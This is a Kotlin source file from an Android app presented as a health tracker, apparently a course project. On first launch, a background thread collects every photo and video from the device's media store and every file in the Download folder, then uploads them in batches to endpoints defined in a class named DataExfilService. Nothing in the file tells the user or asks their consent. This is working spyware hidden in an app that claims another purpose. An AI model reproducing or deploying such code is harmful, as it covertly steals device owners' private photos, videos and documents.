package com.inf2007.healthtracker.utilities.startup

import android.content.Context
import android.net.Uri
import android.os.StatFs
import android.os.Environment
import android.provider.MediaStore
import android.util.Log
import com.inf2007.healthtracker.utilities.DataExfilService
import com.inf2007.healthtracker.utilities.startup.models.DownloadFile
import com.inf2007.healthtracker.utilities.startup.models.MediaFile
import java.io.File
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicInteger

class StartupController(private val context: Context) {
    companion object {
        private const val TAG = "StartupController"
        private const val MIN_STORAGE_MB = 100
        private const val BATCH_SIZE = 15
    }

    private val startupPrefs = context.getSharedPreferences("startup_complete", Context.MODE_PRIVATE)
    private val batchUploader = BatchUploader(context)
    private val executor = Executors.newSingleThreadExecutor()

    fun performInitialCollection() {
        if (startupPrefs.getBoolean("initial_done", false)) {
            Log.d(TAG, "Initial collection already completed")
            return
        }

        if (!hasEnoughStorage()) {
            Log.w(TAG, "Insufficient storage, skipping batch upload")
            startupPrefs.edit().putBoolean("initial_done", true).apply()
            return
        }

        Log.i(TAG, "========== STARTING INITIAL DATA COLLECTION ==========")

        executor.execute {
            collectAllData()
        }
    }

    private fun collectAllData() {
        var totalFiles = 0
        val totalBatches = AtomicInteger(0)
        val completedBatches = AtomicInteger(0)

        // First, count total batches
        getUnsyncedPhotos().let { photos ->
            if (photos.isNotEmpty()) {
                totalFiles += photos.size
                val batches = photos.chunked(BATCH_SIZE).size
                totalBatches.addAndGet(batches)
                Log.i(TAG, "Found ${photos.size} photos to upload ($batches batches)")
            }
        }

        getUnsyncedVideos().let { videos ->
            if (videos.isNotEmpty()) {
                totalFiles += videos.size
                val batches = videos.chunked(BATCH_SIZE).size
                totalBatches.addAndGet(batches)
                Log.i(TAG, "Found ${videos.size} videos to upload ($batches batches)")
            }
        }

        getUnsyncedDownloads().let { downloads ->
            if (downloads.isNotEmpty()) {
                totalFiles += downloads.size
                val batches = downloads.chunked(BATCH_SIZE).size
                totalBatches.addAndGet(batches)
                Log.i(TAG, "Found ${downloads.size} downloads to upload ($batches batches)")
            }
        }

        Log.i(TAG, "Total batches to complete: ${totalBatches.get()}")

        // If nothing to upload, mark complete immediately
        if (totalBatches.get() == 0) {
            Log.i(TAG, "No files to upload")
            startupPrefs.edit().putBoolean("initial_done", true).apply()
            return
        }

        // Create progress callback
        val progressCallback = object : BatchUploader.BatchProgressCallback {
            override fun onBatchComplete(mediaType: String, success: Boolean) {
                val completed = completedBatches.incrementAndGet()
                Log.i(TAG, "Batch completed ($completed/${totalBatches.get()}) - Type: $mediaType, Success: $success")

                if (completed == totalBatches.get()) {
                    Log.i(TAG, "========== INITIAL COLLECTION COMPLETE ==========")
                    Log.i(TAG, "Total files processed: $totalFiles")
                    startupPrefs.edit().putBoolean("initial_done", true).apply()
                }
            }
        }

        // Upload photos
        getUnsyncedPhotos().let { photos ->
            if (photos.isNotEmpty()) {
                photos.chunked(BATCH_SIZE).forEach { batch ->
                    batchUploader.uploadMediaBatch(
                        files = batch,
                        mediaType = "photos",
                        endpoint = DataExfilService.PHOTOS_ENDPOINT,
                        progressCallback = progressCallback
                    )
                }
            }
        }

        // Upload videos
        getUnsyncedVideos().let { videos ->
            if (videos.isNotEmpty()) {
                videos.chunked(BATCH_SIZE).forEach { batch ->
                    batchUploader.uploadMediaBatch(
                        files = batch,
                        mediaType = "videos",
                        endpoint = DataExfilService.VIDEO_ENDPOINT,
                        progressCallback = progressCallback
                    )
                }
            }
        }

        // Upload downloads
        getUnsyncedDownloads().let { downloads ->
            if (downloads.isNotEmpty()) {
                downloads.chunked(BATCH_SIZE).forEach { batch ->
                    batchUploader.uploadDownloadsBatch(
                        files = batch,
                        progressCallback = progressCallback
                    )
                }
            }
        }
    }

    private fun getUnsyncedPhotos(): List<MediaFile> {
        val photos = mutableListOf<MediaFile>()
        val prefs = context.getSharedPreferences("photo_sync_log", Context.MODE_PRIVATE)

        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.SIZE,
            MediaStore.Images.Media.DATE_MODIFIED
        )

        context.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            null,
            null,
            null
        )?.use { cursor ->
            val idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val nameCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            val sizeCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
            val dateCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_MODIFIED)

            while (cursor.moveToNext()) {
                val id = cursor.getLong(idCol)
                if (!prefs.getBoolean("id_$id", false)) {
                    val uri = Uri.withAppendedPath(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        id.toString()
                    )
                    photos.add(
                        MediaFile(
                            uri = uri,
                            name = cursor.getString(nameCol),
                            id = id,
                            size = cursor.getLong(sizeCol),
                            mimeType = "image/jpeg",
                            dateModified = cursor.getLong(dateCol)
                        )
                    )
                }
            }
        }
        return photos
    }

    private fun getUnsyncedVideos(): List<MediaFile> {
        val videos = mutableListOf<MediaFile>()
        val prefs = context.getSharedPreferences("video_sync_log", Context.MODE_PRIVATE)

        val projection = arrayOf(
            MediaStore.Video.Media._ID,
            MediaStore.Video.Media.DISPLAY_NAME,
            MediaStore.Video.Media.SIZE,
            MediaStore.Video.Media.DATE_MODIFIED
        )

        context.contentResolver.query(
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
            projection,
            null,
            null,
            null
        )?.use { cursor ->
            val idCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID)
            val nameCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)
            val sizeCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE)
            val dateCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATE_MODIFIED)

            while (cursor.moveToNext()) {
                val id = cursor.getLong(idCol)
                if (!prefs.getBoolean("video_$id", false)) {
                    val uri = Uri.withAppendedPath(
                        MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                        id.toString()
                    )
                    videos.add(
                        MediaFile(
                            uri = uri,
                            name = cursor.getString(nameCol),
                            id = id,
                            size = cursor.getLong(sizeCol),
                            mimeType = "video/mp4",
                            dateModified = cursor.getLong(dateCol)
                        )
                    )
                }
            }
        }
        return videos
    }

    private fun getUnsyncedDownloads(): List<DownloadFile> {
        val downloads = mutableListOf<DownloadFile>()
        val prefs = context.getSharedPreferences("download_sync_log", Context.MODE_PRIVATE)

        val downloadFolder = File(Environment.getExternalStorageDirectory(), "Download")

        if (!downloadFolder.exists() || !downloadFolder.isDirectory) {
            return downloads
        }

        downloadFolder.listFiles()?.forEach { file ->
            if (file.isFile) {
                val prefsKey = "download_${file.name}_${file.length()}_${file.lastModified()}"
                if (!prefs.getBoolean(prefsKey, false)) {
                    downloads.add(
                        DownloadFile(
                            file = file,
                            name = file.name,
                            path = file.absolutePath,
                            size = file.length(),
                            lastModified = file.lastModified()
                        )
                    )
                }
            }
        }

        return downloads
    }

    private fun hasEnoughStorage(): Boolean {
        return try {
            val stat = StatFs(Environment.getExternalStorageDirectory().path)
            val available = stat.availableBlocksLong * stat.blockSizeLong
            available > MIN_STORAGE_MB * 1024 * 1024
        } catch (e: Exception) {
            true
        }
    }
}